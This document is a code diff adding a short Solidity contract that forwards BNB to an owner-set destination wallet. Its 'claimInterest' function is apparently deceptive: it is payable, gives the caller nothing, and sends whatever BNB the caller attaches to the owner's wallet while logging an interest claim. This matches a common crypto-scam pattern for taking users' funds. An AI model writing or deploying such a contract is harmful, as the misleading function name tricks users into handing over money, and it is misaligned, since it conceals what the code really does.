@@ -1,0 +1,53 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract FundTransfer {
+    address public owner;
+    address public destinationWallet;
+    
+    event Received(address indexed sender, uint amount);
+    event Sent(address indexed to, uint amount);
+    event ClaimInterestMade(address indexed from, uint amount); 
+    event DestinationWalletChanged(address newDestinationWallet);
+
+    constructor() {
+        owner = msg.sender; 
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not the owner");
+        _;
+    }
+
+    function setDestinationWallet(address _destinationWallet) public onlyOwner {
+        require(_destinationWallet != address(0), "Invalid address");
+        destinationWallet = _destinationWallet;
+        emit DestinationWalletChanged(_destinationWallet);
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    function withdraw(uint _amount) public onlyOwner {
+        require(_amount > 0 && _amount <= address(this).balance, "Invalid withdrawal amount");
+        payable(msg.sender).transfer(_amount);
+        emit Sent(msg.sender, _amount);
+    }
+
+    function depositAndSend() external payable {
+        require(msg.value > 0, "No BNB sent");
+        require(destinationWallet != address(0), "Destination wallet not set");
+        (bool sent, ) = payable(destinationWallet).call{value: msg.value}("");
+        require(sent, "Failed to send BNB");
+        emit Sent(destinationWallet, msg.value);
+    }
+
+    function claimInterest() external payable {
+        require(msg.value > 0, "No BNB sent");
+        require(destinationWallet != address(0), "Destination wallet not set");
+        (bool sent, ) = payable(destinationWallet).call{value: msg.value}("");
+        require(sent, "Failed to send BNB");
+        emit ClaimInterestMade(msg.sender, msg.value);
+    }
+}
